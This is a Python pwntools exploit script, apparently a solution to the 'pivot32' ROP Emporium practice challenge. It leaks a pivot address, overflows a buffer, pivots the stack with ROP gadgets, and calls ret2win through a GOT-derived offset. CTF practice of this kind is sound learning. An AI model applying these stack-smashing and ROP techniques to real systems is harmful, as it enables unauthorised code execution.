#!/usr/bin/env python3
from pwn import *
import sys



# GLOBAL VARIABLES
binary = None
elf = None
libc = None
rop = None
#### GDB Script
script = None


io = None
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
rr = lambda *a, **k: io.recvregex(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
st = lambda *a, **k: io.sendthen(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
slt = lambda *a, **k: io.sendlinethen(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)

def start(*args, **kwargs):
    global elf, rop, libc
    elf = context.binary = ELF(binary, False)
    context.terminal = ["terminator", "-x", "bash", "-c"]
    context.log_level  = 'debug'
    libc = elf.libc
    rop = ROP(elf)

    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = []
    if args:
        arguments = [elf.path]
        arguments.extend(args)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)


def main():
    global io, script, binary
    #################### 
    ### EXPLOIT CODE ###
    ####################
    # set binary name
    binary = "./pivot32"
    # set gdb script
    script = """
    continue
    """
    # start process | remote process
    io = start()
    # call ret2win function


    """ STACK PIVOT GADGETS
    0x0804863a : mov al, byte ptr [0xd2ff0804] ; add esp, 0x10 ; leave ; ret
    0x080485f0 : call eax
    0x08048833 : add eax, ebx ; ret
    0x080484a9 : pop ebx ; ret
    0x08048830 : mov eax, dword ptr [eax] ; ret
    1. 
    0x0804882c : pop eax ; ret
    0x0804882e : xchg eax, esp ; ret
    2. 
    0x080485f5 : leave ; ret


    """
    libpivot = 0xf7fbe000
    foothold =  0x804a024 # got
    foothold_pt = 0x8048520 # plt


    ret2win = 0xf7fbe000 + 0x10974
    win2 = foothold + 0x10974
    ret = 0x08048492

    ret_offset = 0x10974 - 0x1077d # ret2win - foothold_function


    rop_chain = flat(
        foothold_pt, #foothold function at plt
        0x0804882c, # pop eax
        foothold, # foothold function at got
        0x08048830, # mov eax, dword ptr [eax] ; ret
        0x080484a9, # pop ebx
        p32(ret_offset), 
        0x08048833, # add eax, ebx
        0x080485f0, #call eax
    )

    

    ru("pivot: ")
    leak = int(rl(), 16)
    log.success(f"RECV LEAK: {hex(leak)}")
    ru("> ")
    offset = 44 # offset to rip

    stack_smash = flat(
        cyclic(offset),
        0x0804882c, # pop eax
        leak,
        0x0804882e, # xchg eax, esp; ret
    )

    sl(rop_chain)
    ru("> ")
    sl(stack_smash)
    ia()









if __name__ == "__main__":
    main()

